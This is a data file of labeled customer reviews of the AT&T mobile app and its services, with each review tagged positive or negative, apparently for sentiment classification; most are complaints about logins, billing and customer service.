"I recently just got a line with AT&T and was told to download this app and create a account. But the problem is I can’t even create a account because the stupid app pops up with a error message saying “sorry we could not process your request at this time, please try again” every time I get to the part where I create my security questions and it’s been doing this for the last day and a half as a new user I’m very irritated and annoyed at this point.",negative

Terrible App. Can’t retrieve any relevant information within a reasonable time,negative
"When going into the app, it hasn’t updated since May.",negative
I’m shocked to see +4 stars on this app. It NEVER works. I open and close it 3-4 times every month when I need to pay my bill. Also delete it and redownload every couple months.,negative
"Since the recent AT&T update I have had NOTHING but problems logging in. I’ve been a customer of AT&T for many, many years and this is the worst thing that’s ever happened!! Fix immediately before Verizon gets everybody’s business!!",negative
Terrible. The agent just stopped the chat once he heard my complaint over an amount billed of unauthorized charges.,negative
I have wasted nearly three hours trying to get I to my account to see a bill. I followed all of the  and reset my password four times. It’s stuck on an endless loop between telling me my account is locked and telling me to reset my password. Utterly ridiculous! ??,negative
Just get a different phone service. Don’t even waste your time,negative
The app works fine when you need information about your bill but seems to crash every time if you want to cancel your account or speak to someone.,negative
Absolute waist of a company that can’t even figure out how to start a new account with 3 phones. Nothing but a hassle and numerous hours on the phone and a week later still have 2 phones not activated nothing on my account is correct and nobody can fix it,negative
"Horrible customer service, your representatives lie to customers just to get them off the phone. AT&T is border line fraudulent this app does not work half the time trying to schedule payment arrangements.",negative
Cumbersome,negative

"Your logs are great, very helpful as well as your staff that answers questions and helps me out?????",positive
I wish it would show what it using all the data so I could delete the app that is using so much other than that it is working pretty good,positive
Cost to much!!,negative
"Not able to sign in, keep getting a “temporary system error” message.",negative
I was on the phone almost 2 hours to get an issue resolved! Customer service stinks and I will be finding a new provider!,negative
"For some reason every month my bill goes up started off paying 112 a month and then it went up to 145 a month now it’s over $200 , called several times and spoke to someone that could not get what I was trying to say gave me the runaround",negative
My plan included roaming in Canada and Mexico and this was changed without notifying me and thus I got stuck with roaming charges. TonVerizon as soon I can get there,negative
"Since the last update it doesn't work says to use web view for interstitial
Have to use my pc to pay",negative
The agent never replied to help me again!,negative
I called AT&T went we were no longer able to get NBC.  They were not able to tell me when the service would come back. They will not adjust our bill due to not getting us that channel . I’m. Wry is set . They are not keeping us informed on what is going on. Looking for new service now.,negative
"I manage our account. But two changes recently make managing the account much harder. First, we added a mobile device to the account for my wife, and second was AT&T added an extra layer of security, so now when I try to log in, it asks to send a code to my wife’s phone. This is not practical. The last agent said this is how it works, and said if I just use her phone one time to log in, then it will be fine. Not true. I used her phone to get the security code in the past, but here I am facing the same issue. What a joke of an app that it can’t send to MY phone, which is the primary phone on the account. So, the app doesn’t work for me and I’m giving it a one star.",negative
Doesn’t work half the time and makes me re sign in after using Face ID. Also shows current bill price but can’t view bill half the time just all around not user friendly at all.,negative
App is extremely slow.  I have iPhone XS and have trouble loading the app all the time.  Looks like they would be fast but att is the only app I have a problem with,negative
"No one can resolve technical issues that works for ATT. WAS on the phone 1 1/2 hours, switched to 6 people and no one could figure out how to fix the website issues.",negative
"Ever since the merger between direct tv and att it’s been such a task to just pay my bill thru this app! Horrible, and the best part is when you call for help your on the phone for an hour and get freakin no where because the people on the other line don’t know what they’re talking about.",negative
Mostly I just spend time tapping on the things that I want to see and this app just love tapping cause nothing happens and you just keep tapping. Waste of time and energy.,negative
You guys are too high and I could not understand the agent. Been with y’all for about 30 years it’s sad to see how att does their faithful customers. Very disappointed,negative
I can not get no answers for my questions I paid at apple all fees and still get charged again I will speak to someone and send them a copy thanks,negative
"They advised me to download this app and I’ve never been able to sign in. Even after a representative helped me, once I got through numerous password attempts, I received a prompt that said, Sorry, At this time, we are unable to access your account. Please try again later. 
So I called them...
What a mistake that was. 
“Can I verify this? Then that? Then this again?”
Wasted 20 minutes of my life and got no where but more irritated. 
Today I tried again. (Actually, I’ve tried several times)
Nope. Can’t access my account right now. 
Please try again later. 
I’m stuck in this contract until December. 
And trust me, the moment they set me free, I’ll be gone.

Worst app. 
Worst option when you are considering a cable company. 
Do yourself a favor, look elsewhere.",negative

What’s not to enjoy?",negative
I’m getting so fed this unnecessary charges,negative
Love my phone an service,positive
"The app rarely ever works. My internet constantly gets disconnected from my phone. When I’m watching something recordered it will exit to live tv, and my genie mini cuts out at least 10x a day. So freaking frustrated with ATT as a whole. We are ready to drop every service we have with them.",negative
Att continues to have data missing in their reports. I spent 6 months trying to resolve with no fix.  ATT wants me to accurately pay my bills but cannot provide complete and accurate back up.,negative
Terrible pricing and bad customer service not recommended,negative
"You guys are terrible!
I am really upset at you guys for constantly telling me one thing and doing another!
Why do you keep raising my bill unnecessarily?
This is absolutely ignominious!",negative
I switched to ATT and it was a mistake.  Service is poor with the products and the customer service matches the poor products.  Switching back as soon as the agreement expires!! Don’t do business with ATT for anything!!,negative
I can’t find when my internet and phone contracts are over,negative
"My family had been a customer with AT&T since it’s transition from pacific Bell. We have never had any issues until... I had to cut out my home phone service, my U verse tv and I canceled one of my cell phones. Since this time I have had nothing but horrible service. I made a payment arrangement yet my service was still cut off. I inquired about this and coincidentally the transmission was deleted. I spoke to multiple representatives was given conflicting information. The last representative I spoke with admitted, on a recorded line that the previous representatives lied to me. I spoke with a manager who excused me of falsifying a request for a payment arrangement in order to have my phone service turned on without,
This was not true. I made the arrangement because I had to wait until I got paid at the end of the month, his name was Alan and he was incredibly rude. I asked him to do an investigation as to why transmissions were deleted and Alan stated “do you know all the forms I have to fill out to do this?” Suffice it to say I went to pay my bill and the AT&T store sales associate informed me they don’t accept coins (0.95.
After dealing with unhelpful representatives and being given the run around for 6 hours I was done at this point. I asked the sales associate how I was going to pay and she said “I don’t know, we don’t take payments here” o told her I made a payment last week and she said “well if the manager says so then I guess it’s ok” AT&T only cares about SELLING, SELLING, SELLING! And upgrading phones they no longer care about their customers at all. I have my cell phones under a few more months of a contract and when that is done I’m through with AT&T! ??",negative
no me gusta tener facturas conbinadas tendre que cancelar el internet,negative
"I get text alerts and emails stating my bill is one amount.  When I log in to the app, it states my amount due is $0.00 - every time.  Frustrating!",negative
Very expensive plans and rates and app freezes up more than it works,negative
"My bill has increased by $10. Prices for ATT services are notoriously expensive. I have internet, Directv, and cell and I don’t get a discount as a loyal customer. This is ridiculous!",negative
Never brings up acc details,negative
I had a bundle package with at&t internet and directv.  My bill would go up every year. So I would call and try to lower my bill.  Sometimes for the better sometimes not.  The last time was not.  I canceled the directv part of my bill in February.  It was 3 day past my billing cycle.  I did not know I would be charged for a whole month because I did not cancel 3 days earlier.  I DO NOT feel I owe this full amount.  I do agree that I owe for 3 days. So after call over and over again to get this straightened out I have not had any luck.  I have continued to pay my internet bill until it was disconnected on the 4th of June. So if you have a bundle package and you are not happy with one of the services you have it can affect all of your services .                 Not a customer any more,negative
Lately the app is not responding or taking too long to do it. Right now I’m trying to see my latest bill and nothing happens.,negative
"None of the options are working. It hangs up.
Kicks you out of the app.
Doesn’t show my bill statement.",negative
"Very unhappy with the service from AT&T. I am unable to send text messages or make calls when I am in buildings or in certain areas.

Customer service says one thing and does something totally different. 

If I am paying almost $300/month for service I should be able to send text messages and make phone calls from any and all buildings.

Switching to AT&T was the worste decision I ever made!!!!!!!",negative
I am locked out of the app and no one is helping me.  U Suk.,negative
The website as well as the mobile app often crash or are completely offline. Very disappointed.,negative
Makes life easier,positive
This is a easy and fast way to pay the bill.,positive
Easy and convenient,positive
"This new app is absolute garbage. The dashboard shows you nothing except an ad to add Direct Tv service. Ok, fine hit the menu and select let’s say billing and payments. It still shows me nothing. No data usage, due date, due amount, nothing. Matter fact, it doesn’t even seem to know what my payment method on file is (I have automatic payments set up). Once again this app does nothing. Waste of space. Fix it or get rid of it.",negative
I like it better when all I had to do is click on app flash face and takes me straight to account overview.  Instead of having to click here click there and click there too,negative
Slow buggy and incorrect data being displayed I downloaded to check my at&t wireless bill but only shows a direct tv trial I canceled 2 years ago still no clue about my phone bill thanks at&t,negative
Buggy and crashes a lot.,negative
"I was in the middle of the chat, waiting for over 10 minutes for an answer to find out The representative left without bothering to reach back to me.  Zero Star to AT&T",negative
"AT&T is the WORST in ALL areas. We have been loyal customers for 20+ years. NEVER have we had the problems with this company that we have recently had.  They use to be the best, and are now at the bottom of the bottom!  We have gotten the run around for over a month on why we can’t pull up our bill and pay it. When MOST companies have to chase down customers to pay their bill, we had to spend HOURS upon HOURS with their crappy excuse for tech support ppl. Those hours of our life we will NEVER get back. ???? One of the customer service reps that I got sent to, who was supposedly a manager, answered the call with a screaming kid in the back ground!  Come on AT&T, REALLY?  So unprofessional!  Our problems STILL aren’t fixed, and all we wanted to do was pay a stupid bill because it’s due!  You guys seriously need to get your crap together!! If you’re contemplating AT&T... RUN THE OTHER WAY!  They aren’t a good company for service, price, OR CUSTOMER SERVICE!",negative
I have spent many hours over the last 3 months trying to get my bill corrected. The first of the month times 3 I have called. Was told the bill was corrected to only get the next month bill and it was the same. Try again ‘assured ‘ it was corrected and so sorry for your trouble. Next month the same. Even had an email that my account was being credited—— no such thing. Same stuff. I changed carriers and solved my problem.  Told to call ‘this number ‘ at UPS and they would pickup ATT eqpt Due to my age and health. Called UPS and they do not pickup ATT eqpt for credit. UPS stated they get calls like mine when ATT knows they don’t pickup for credit. So disgusting!!!!!!,negative
I have been with ATT for the past 4years and they went up on my bill $30.  I’m a loyal customer and would love to keep my services but going up $30 is a bit much.  #cancelingmyservices,negative
????,positive
"I was denied discounts on autopay and paperless billing. Reason I was quoted was I have a credit card attached. My response is that I attached my visa /debit from my bank. I was still denied! I have being going through ups and downs with At$t for to long and more so, downs.",negative
They made us feel like we were in good hands!!,positive
I’ve been trying to access my account for the last hour but glitches instead.,negative
"This app requires updates annoyingly frequently. I use it maybe 1 time per month, but inevitably every time I open it, it demands an update before it can be used. So annoying. ATT, you’ll save some money if you fire the software engineers and just leave it alone.",negative
"I used to be a fan. They have had pretty good coverage. I like that they have started flagging calls as “Telemarketing”, etc. 
Unfortunately the service I get is twice as expensive as my girlfriends service for the same coverage.",negative
"Every few days I log into this app I am constantly having to change my password after having JUST changed it. This has been going on for MONTHS and other people in my family experience the same thing. It is soooo annoying and I have contact them about this problem only for nothing to be done. I also use my Touch ID to log in but even after updating my password on my Touch ID, it still says I am using the wrong password. I am very tech savvy and make sure that every time I change my password, my Touch ID is updated as well. This issue needs to be fixed ASAP! I am so tired of dealing with it!",negative
At&t has horrible service on customer services.,negative
Internet on phone Service is horrible!!,negative
Excellent service.  Asked general questions.  The agent Erin was very professional and knowledgeable.,positive
I don’t like the app changes.. lost all my stored billing info,negative

Pretty bad when your account info won’t load. It happens a lot. I’m glad I don’t pay my bill through this app.,negative

The best and good phone Carrier. Had other carriers in the past and so far AT&T the best glad I switch to them,positive
Two words ——- TERRIBLE SERVICE,negative
Awful experience on chat,negative
"More ETA: At least they removed the unnecessary extra steps. Still garbage. Still glitchy and slow and the &$?!%#€ useless survey harassment continues! I say again, don’t be tempted. Anything said, any responses offered, go into some black void. Waste. Of. Time. And. Effort. AT&T doesn’t give a rat’s butt what their customers think or say. Just hand over the money. ??
—

ETA: There’s still an inconvenient, unnecessary step getting to the account information that was not there before. Still one of the worst apps there is.
—

Amazing! My bad review has disappeared. 

How about another one. To sum it up: this garbage app gets WORSE with every update. Slow, glitchy, mostly useless, and now multiple steps to get where it started before. Oh, and the survey requests... horrible harassment and entirely pointless! Don’t be tempted, because it’s a waste of time.

Enough said.",negative
Have not been able to log into this app in several months now. Still unable to click on button to send verification code to phone number even after new update.,negative
"I will have to switch. I have no reception and it takes forever at the store to get anything done not because the people there aren’t trying, it’s because the customer service people on the phone make it all difficult.",negative
"They just bounce you around to different reps hoping you will he tired of telling them your problem. They say they have corrected the problem but it still exists. This last time I was transferred after 25 minutes and was on hold for an hour and 38 minutes!  I’ve had AT&T for 25 years I think they have gotten too big and really don’t care about their customers! Don’t bother writing to their corporate office, they don’t respond either!",negative
I recently got the ATT app bc I can’t log in online. It’s been 2 months since I have been able to log in and no one at ATT can resolve it. So that’s when I downloaded the app and guess what I still can’t log in and no one seems to know why. Very frustrating!!,negative
Why is this $96.22 keep appearing on my statement when AT&T told me in 4-2-19&again in 5-2019 that this charge would be removed from my statement? Would this be grounds for my cancellation of my account with AT&T ?,negative
This is the worst phone company ever!!! To many Hidden Fees and Service is worst than T Mobile's,negative
Agent Myla was very helpful,positive
Very unhappy with the level of service,negative
Your authentication process is terrible.,negative
Att just updated their app and now it does not work at all. Can’t view my bill or payments.,negative
Love looking up my bill that is completely coming  due soon on this app saves me tome and makes it very easy and accessible to pay my cell phone bill by electronic bank info and then i dont worry that the bill is due. This app is a easy and convenient to use and have,positive
Last Chat took forever the dropped,negative
"One star for this app is too generous.
It deserves less!
It doesn't work when you're roaming internationally. It keeps logging off as soon as you log in. It's basically useless at the times when most needed. 
It's very frustrating not to have access to your account when abroad and need to add features and options.
AT&T should be ashamed of such a product. Even startups have better apps than this. AT&T sure knows well how to add monthly charges to our accounts but don't know how to get this app to function properly.
This app is a joke!!!
I couldn't even log into my account from any browser while abroad. Again so ridiculous to have such products from mogul carrier like AT&T with billiona of dollars and assets.

"It randomly asked me for my phone number again, and a diff email. Now I’m unable to see my balance nor make a payment. 
Such BS I’m so frustrated. This app is never working 100% if it’s not the repetitive log out sessions, the security codes etc all a hassle",negative
I had to rest my password because it didn’t like all the ones I used.. I felt more complicated than when I usted to work for the government.. I just thought that it was to secure for something this is not too important.,negative

Was told they’re having technical issues. I’m used to accessing it at any time , seeing how my data is being used etc . I have 4 lines of service and I like to keep tabs on this . I was told by customer service that no worries I won’t exceed my data as I have unlimited. However that wasn’t exactly my point . And they have no clue when the app will be fixed . It’s now been 3 weeks. I can’t do anything from the app . Very frustrating!!",negative
Stop asking for a rating.,negative
"I been with ATT on and off for 30 years, 
It’s always the same you guys take over a good working company and ruin it!!

I was with Cingular when you took over that company and I had to get out customer service got worse coverage got worse it just got worse! 

Now you’ve taken over DIRECTV and I would never go back to DIRECTV I had him for 16 years until you took them over prices is the big thing.

I’ve had your cell phone service now for 18 months and the coverage seems to keep going down and down places you expect to have good coverage nothing there.

Thank you

"AT&T has failed to cancel my cable and credit my account. 3 calls later and I was assured that my bill would reflect this cancellation and I would see a credit within a few hours and still no credit..... if I didn’t have contracted phones, I would move entirely to a different company.  It shouldn’t be this difficult to cancel a service..... I’m disgusted.",negative

I recently switched from Spectrum to your Services.  I have talked to several Customer Service Reps and Managers.  I have been tied up on the phone for hours in talking to all these different people  One Manager left me on the line for over 45 minutes before the Call disconnected never came back to the line..  I switched Services hoping that your Company would be better.  The Service has been a little over a month and I have called numerous times for the Tv and boxes not working.  My Main Problem is that I was set up on Auto Pay but I was never asked for any Bank Account Information.  I had your Service 3 years back.  So the Rep used that information to set up Auto Pay.  WHY IS MY BANK ACCOUNT INFORMATIONS   STILL IN YOUR RECORDS?    I AM SURE THAT THIS INFORMATION SHOULD HAVE BEEN DELETED AT THE TIME OF SERVICE BEING CANCELLED. I have spoken as stated above to your Rep and Managers about this and no one has return my calls as they say they would or taken this higher up.  I would Appreciate a REPLY from someone regarding this.  I think when training your Employees you would be more concerned about solving a problem instead of someone “will call you” and no one calls.  It has been over 2 weeks since the last someone will call.  At least you could train your Employees to give the same RESPONSE INSTEAD OF MAKING UP LIES AS THEY TALK TO YOU.  I will definitely be making a change when this Contract is up.  VERY DISSATISFIED CUSTOMER!,negative
ATT uses bait and switch on Data plans. Sales People Lie about unlimited data plans and ATT will reduce speeds after certain amounts of data. Goal to get you to spend even more on Data. If anyone is currently suing them ... I would like to join the lawsuit.,negative
Supposed to be a cutting edge tech giant? Can’t even provide a working app to view and manage your account. Buying out my phone and switching to real provider.,negative
Ahorras tiempo,positive
is good,positive
This app is horrible. I can’t access my account ever. I want out!,negative
"I like that the app is most logical. Once they change something in the format, it’s not difficult to understand. And it’s very convenient.",positive
I changed my password and it continues to say that something is wrong when I sign in. Hate the app!!!,negative
"I’m really disappointed in direct tv for dropping the Fox channel.
Was one of our favorite channels .
If the channel is not back on the line up before foot ball seasoning I will be canceling my account and find someone who does carry Fox.",negative
"AT&T’s service is awful. Their app runs just like their company....slow, bumbling, and never gives you the information you actually need.",negative
This app is no longer easy to use. And since the DIRECTV through AT&T service has been bundled into this app I am no longer able to easily locate my bill or pay it with the app. I have to mail it in again. What is the point in having an app if it’s not user-friendly?!,negative
Does not always work,negative
I am Not impressed.,negative
"Since AT&T has merged with Direct TV, navigating the app has become difficult. Often when signing in the information is not up to date and states that you need to re enter the password. Unfortunately, the log in screen does not appear and you are purgatory state looking at the ghost image of a bill from months past. Make a solid delineation between paying your Direct TV bill and AT&T bill.",negative
ATT has gotten pretty pricey.   I’m interested in knowing how much other companies are charging and how their service is.  I have a feeling ATT is on the high end and that the service isn’t any better than the average.  I’ve only spoken with a few people so far but that’s what I’m getting in terms of comparison.  Shop around is my suggestion.  Be smart.,positive
Why does my bill continue to jump up when it’s supposed to be a set amount.,negative
"Service is very poor! Customer service is over seas and extremely poor!!
Needs to be an negative star rating!",negative
I have been a satisfied customer of at&t for mre than a decade. For the past two months trying to bundle services i wish i had never heard of this company.  I have had about all i can stand,negative
"Long time customer so I know how great you used to be but your service is now horrible with little or no internet connectivity in my work and living zip code 32819, particularly in busy evening hours when I need it most. I will pay my device off this month and leave AT&T after 25 years of loyalty because you have dropped the ball.",negative
"I am so tired of the run around I get from any of the At&t service departments - it does not matter which department I talk to - my bill has been wrong every month since Dec 2018- still wrong today!!  
On line chats are useless- most of the time I get a check back later message!
Even when an agent helps- the monthly bill shows up wrong again!",negative
"For the past 6 months my AT&T app doesn’t work on my phone. I have an iPhone 8 Plus. I’ve tried to delete the app and download again it doesn’t work it shows a message that reads login timed out , so I have to use the website to login",negative
Great service,positive
Notification Alert will not go away. Print your statement does not work. I am sure if it worked more often I could give it a worse rating.,negative
"The App needs a lot of improvement! I haven’t been able to link my accounts, only shows the internet charges and not cell services. Some updates only requires to provide an AT&T email address and I doesn’t give you any option to provide a personal email address. So far a bad experience with it.",negative
AT&T always trying to get over on people,negative
Att is a bunch of crooks!  Rip off!,negative
Lately I’ve been experiencing periodical network connection problems where “No Service” would show on phone or network would change from LTE to 4G where I can’t browse the internet.,negative
I can’t do anything with this ? Why bother nothing works says I’m logged in yet it wants password then there’s no place for my password,negative
"Every time I try to sign in, the app tells me my password is incorrect. I have to change my password every time I sign in.  
I have called AT&T many times to no avail.",negative
Wow. So bad. Full of hassles. Which is the only thing you users DON’T want. Think ahead,negative
We have had nothing but issues with AT&T! Every month I have to call them due to internet issues and no one in customer service seems to have a clue what’s going on and I have to be on the phone sometimes an HOUR!!! It’s absolutely ridiculous!! About to change service because cannot handle it anymore!! Do not get AT&T!!! Save your money and go elsewhere!!!,negative
"I must have oops too. You did not show up 4 times this month to install my internet service. I been with ATT before It became ATT. I can’t even give you a star it would make me a lie. Please pass this on to your manager please. I would love to inform about the service we are not receiving.            
Mark",negative
App could be very useful. Runs really slow. I would think a leader like ATT could make their own apps on their own network operate much smoother.,negative
AT&T is horrible. The bill changes each month with no warning. I cancelled my direct TV and internet and they wouldn’t do it till the end of the billing cycle. Thieves!!!!,negative
"I am extremely feed up with at&t I have been a loyal customer for many years, and they are find with me leaving them. So I will.",negative
The app lags when you try to navigate the menu options and it crashes frequently. Not user friendly- at all. This app is enough to make me want to transfer to a different provider. But I probably won’t.,negative
"Even they talk really really nice to the costumer, in most cases they are not able to solve,",negative
Can’t print bill from app,negative
Been fighting billing errors since February. They say they will correct my monthly bill errors but it never happens. They give me the credit do and say the bill will be corrected on future bills but than the bill comes and I have to call again for the credit! Getting berry irritated!,negative
"I hate the games. One month it’s - we can offer you a discount, three months later your bill doubled.",negative
Works great and I love being able to review and pay my combined bill. Thanks!,positive
Be careful with this app. Sometimes it does not work and your payments do not go through.,negative
I’ve had no trouble paying my Dtv bill online u til AT&T took over. Now about every 3-4 months I have to call At&t to reset it. Common let’s straighten this out.,negative
"AT&T is disgustingly difficult to navigate both on the phone and online. I had a problem deciphering a bill, but finally gave up doing it myself. I went to a store for assistance with a real representative. Forty five minutes later, four phone calls later, and the issue had not been resolved. I was told to wait for the next billing cycle to see if it would be clarified. Not my idea of good customer service!",negative
"I don’t know what the hell is going on with At&t but it seems to always be something. The app seriously needs an update because I constantly have to login as if I was a new customer or as if I just downloaded the app, when I’ve had it for 2 years. Currently, I can’t login because the app times out. FIX IT!!!!!!!",negative
"I have tried on 3 separate occasions to get someone on the phone to discuss my bill. On hold 20 - 30 - 45 minutes and no one has ever answered. This is after an initial phone conversation with someone that was about 30 minutes in duration including hold time. She transferred me to the “loyalty” department which I held for another 20 minutes and kept getting an advertisement then constant ringing and back forth repeatedly. I eventually hung up. It was a complete waste of time and shows how AT & T values a customer of 40 years. I will be switching to Spectrum in the next couple of weeks for a much lower plan price of $142 a month including tax for 2 phone lines, High speed internet and 200 HD channels. My AT&T bill is $277 this month. What would you do?",negative
AT&T are probably the best scammers and the worst when it comes to service! They will charge you unaffordable and unreasonable prices while on top of that giving you the worst internet service ever! I’m paying for 75mpbs which feels like less than 50 and a difference monthly charge even though I pay my bills on time and don’t owe them anything! Thank you AT&T for being the worst service ever! I never had an issue with Spectrum.,negative
I’ve been a long time AT&T customer and the service and app has never been worse. My app says “there’s a hiccup with our system” and regularly doesn’t show my usage. It makes it impossible to manage my data usage. It’s been three weeks and hours with customer service and still no resolution. If it’s not resolved soon then I’ll be finding a new wireless service,negative
I would not consider this a service it’s more like a run around! I would recommend just using your cell phone from another carrier. If att can’t figure out how to provide service by now they never will. Good luck to you who are stuck with att!,negative
Pointless,negative
Perfect!,positive
"Trying to pay my bill on the app, I tap pay bill it lights up and nothing happens.",negative
Very fast and easy to pay bill,positive
"Update after update & usage widget still not working. How hard is it just fix the problem already! Fix it!

I should add the usage information on the app stoped working altogether. But the advertisements still work just fine. In fact the advertisements always work but not the usage information those hardly ever work.",negative
"I have had an issue with ATT for over 5 months with no resolution.  ATT’s inability to solve the issues associated with my account has rendered the app to a useless state.  I cannot see my bill, but the app has no problem displaying the amount due and the date it is due.  I am not able to view the actual bill.  Plus ATT has decided not to send me a paper bill - it’s just “pay what we say you owe” without supporting documentation.  ATT customer service is terrible - I had a rep “accidentally disconnect” when they could not figure out their own system.",negative
I did not authorize a bill to be paid it was paid twice! I received no notice of these funds being taken out of my checking account??.,negative
User friendly and incredibly informative,positive
It’s horribly slow,negative
The app is awful!! It never works it still says I owe money and I have already paid my bill!!,negative
"Due the getting 20 robot calls in 8 hours each day I wanted to reduce the number of rings on my cell phone. But I am doing this due to the number of trash calls. I have my vibrate on and lights flash so when I get many calls it is hard on my battery.

Problem : Stupid robot calls

I must contact ATT to reduce my rings from 8 to 4. But how?? I still do not know because the ATT app does not have a way for us to change the number of rings.

For basics the app is ok..",negative
I have a chat thread record that I have been awaiting follow up on - then when I connect again to review again the follow up expectations from my previous chat - I cannot hey connected to anyone.,negative
"I’m lost for words on this company. Morally, ethically and customer servilely horrible.",negative
Poor reception most of the time one bar and at times not connecting when I make calls thinking of changing service,negative
"When AT&T merged with Direct TV, I bought a phone since I had such good luck with Direct TV’s excellent customer service. Well evidently AT&T didn’t merge with their customer service because it has been horrendous. They can’t make it to where I can see my plan online and it has been that way for two years! I am ditching AT&T and going with Verizon because they can’t even manage this simple task.",negative
"The app is a disaster.
Slow.  Clunky.  Non-responsive.
Time to look for a new service provider.",negative
"Reception is terrible. I loose everyone I’m talking to on the phone. There are dead spots in my house. You need more towers in Frisco, Texas. I extremely miss Verizon!,",negative
"I have horrible absolutely no service at my house in Ingram and Kerrville, TX. Almost customer service at local branch in Kerrville, TX employees have an attitude that displays they really don’t want to be a work and are miserable at their job environments.",negative
"This app is inconvenient, outdated, has numerous glitches, is not user friendly. Data should be easily accessed in a user friendly format.",negative
"Hard to navigate, impossible to get help, or contact a live person. Just the kind of web support I’ve learned to accept from this company.  At least they are consistent.",negative
"Document, usage, and many other sections in the app do not load or will take 10+ minutes to pop up a simple summary page.",negative
It will not let me sign in after several attempts. Keeps redirecting me to sign in after doing several verification code,negative
AT&T Have been telling me for months that they would pay for my 3rd line because of something one of they employees have done to my account but it turns out all alone that I’ve been paying for this! So I called and and canceled the line and I’m stillll paying for that 3rd line!!!! Worse phone company I have ever dealt with!,negative
Ever month my bill changes and when you call you get the worse service bc your on hold forever and transfer to all different areas...,negative
"I have been an AT&T customer for years. How, in 2019, can their app STILL be so terrible? I DREAD needing to interact with the app because it ALWAYS takes WAY too long, and because I always come away feeling frustrated, and sometimes enraged. PLEASE consider customer experience!",negative
This app is so buggy and takes forever to use and I just get frustrated because all I want to do is pay my bill but the app won’t load or it glitches and goes back and oh my god I get so mad,negative
Mediocre,negative
Greatest,positive
"For seven days, Every time I try to use my app to view my bill it will not allow me to look at the bill and throws me back to the login screen. So I called AT&T customer service last week and the representative could never pull up my record after 15 minutes of trying and I finally hung up. It’s so frustrating",negative
Your app doesn’t work,negative
Because twice now when I’ve set up payment arrangements. It’s came out early 3x and made me have overdrafts in my checking account,negative
"App was great but now nothing opens have uninstalled and reinstalled can’t pay bill, can’t see bill. Please go back to how it was.",negative
I’m agreeing with most of the reviews. You took a decent app and turned it into garbage. I’m having issues with all of it. Can’t log in. Keeps saying try again later. When I can get in I have to wade thru a lot of crap just to see my account. Very disappointed. One star is too much.,negative
Unfortunately I am having trouble signing in to pay my bill I keep going in circles and circles and circles and push the account and cannot retrieve the proper pay billing screen,negative
It’s ridiculous your call and text log is behind 6 hours if the log even has half to calls on text on it would also be nice it’s doesn’t list all them,negative
App gets worse now it is a annoying bright white why why why should had left it alone the white background is annoying it fits tho jus like att itself one day I will leave att for something else if not for anything jus to do w out is probably better,negative
Two words horrible service. Will change soon. The bill fluctuate just like the channels.,negative
Won’t load at all and I have brand new I phone,negative
I had to go overseas for 2 months and every time I try to access my account it keeps telling me it does not recognize my password. I spent almost two hours getting access. Just tried to access my account again and am getting the same messages again!!!!!!!!!!!!,negative
I hate it. It never works for me.,negative
"Just notified AT&T that I’m moving to another carrier within the next couple of days....
My bill was due today, and I called to find out if I should pay my bill (being that I actually have two weeks left on this cycle), or will they prorate it and send me a refund for what I don’t use.
The answer was this:
If I don’t pay my bill, I get a late fee (not an offer to make a note on the account).
And after I pay the bill, they won’t refund me ANYTHING. They’re just going to essentially STEAL my money.
Good to know.",negative
I log in then try to pay my bill and it continuously takes me back to the sign in page.,negative
"I have been calling and speaking to multiple agents to resolve my issue. My service has been disconnected and no one still haven’t resolved my predicament. 
I paid what I was instructed and I still have no service. 
I would not recommend AT&T to anyone.
Worst service even, Comcast is slightly better.",negative
I can’t even log into my account to see payments or anything. It keeps going back to my log in every time. I hate the update!,negative
"I can never log in via this app.  I’ve tried numerous times and even removed and downloaded again and every time I’ll either get a “getting information” message which never stops or a “hmm something is wrong” message neither of which allows me to get into my account.  I’ve tried now over the past 6 months and each time I end up going to the website which works fine with the same credentials so I’m pretty sure it’s not my account that’s causing the problem. Please address this, or just get rid of your app already.",negative
Every time I try to use the app it states. Hmm looks like something is not working. But I can log in on the internet fine,negative
Your new app is so confusing. I thought I made a payment but got a nasty email I was over due and got a late fee. I don't want to see my TV bill with my phone bill I'd like to keep it separate and not bundle it,negative
"My App stopped working a week and half ago. Says there is a temporary system error, which apparently means forever. Deleted the App, reinstalled, and same as before ??",negative
Great service but many dropped calls sometimes,positive
Chat keeps on cutting out - 3 times got through - 3 times just left hanging - really frustrating,negative
"While trying to log in to the app it loads my saved account but wants me to confirm my identity. No problem there, until I get to the screen where it has the phone numbers to choose where to send the code and with two buttons of “Send Code” (one blue and other gray) and a cancel button. None of those work! I tried tapping everywhere on the screen and the only place that responded was where the phone numbers were. This is not the first instance of this event. All I want to do is be able to use the app for its intended purpose. So frustrating.",negative
“Last updated” date always takes forever to load.  Very irritating,negative
Happy Customer,positive
"AT & T is too big and has lost consistency.  We have called and called and received answers thinking all has been corrected 
   No, 3-5 months later we deal with same mixups in their office.   Wait time is ridiculously long too 
   Need some improving for sure !",negative
"I am not happy with my choice to switch to AT&T. I get terrible phone service, especially in my home. I try to get online and most of the time I can’t get on. A very dissatisfied customer!",negative
Pirates,negative
Was much better prior to AT&T takeover.,negative
Great service as well as customer service. I’ve been with AT&T over 10 years and no problems.,positive
You get my bill wrong every single month and I have to spend hours trying to get it fixed only to have someone tell me they are kicking it up to the “back office” and someone will call me back and that never happens. I’m cancelling my service. I hate you and I will blast you on social media and tell everyone I know and don’t know not to go with att or directv,negative
"Both services are bad, was on the phone for over an hour trying to get my service corrected. Will never use their service again. Will cancel all att services including cell phone.",negative
made a payment arrangements... but still transaction charge was deducted to my bank. Making my bank account overdraws with negative balance..... unbelievable!,negative
My bill went up by $100 don't know why bb,negative
"AT&T a has one again raised my bill. I am in the process of finding all new providers for the 3 services I currently have Internet, cell phone, and Direct Tv. Good by AT&T!",negative
This is the worst app which we cannot open also every time I have been using this app but never my account was opening in the app and I need to go to web page and sign in over there. Finally to tell there is no use of the mobile app,negative
No response on a live chat.,negative
Very disappointed with the service.,negative
I can schedule a payment. I don’t want auto pay. I have to pay immediately. No one but you guys is this difficult.,negative
Love this app and how much detail it shows.,positive
"If I could give it 0 stars I would!!
I don't even know where to start. 
It's extremely unfortunate I don't have any other cable providers on my building to go with. 
From day one when I signed up, they messed it up by telling me I was told I could have direct TV. Then, the guy comes to set it up, and first thing he said was there's no way this building offers direct TV.
So, the supervisor came here to try and fix it, they were here several hours. 
Then, they messed up my packages, DOUBLE CHARGED my account several times just after being here for a week my account said it was OVER DUE! LOL
This cable provider is a joke. I can go on and on with other issues I've had. 
But, needless to say... STAY AWAY FROM U-VERSE /AT&T PERIOD! NOT Satisfied, and I can't wait till I can have another cable option!!",negative
"Worst app ever, not user friendly and you have to put your password in way to many times. Also, it forces you to combine account, even when you don’t want that function. App needs a complete overhaul!!!!!!",negative
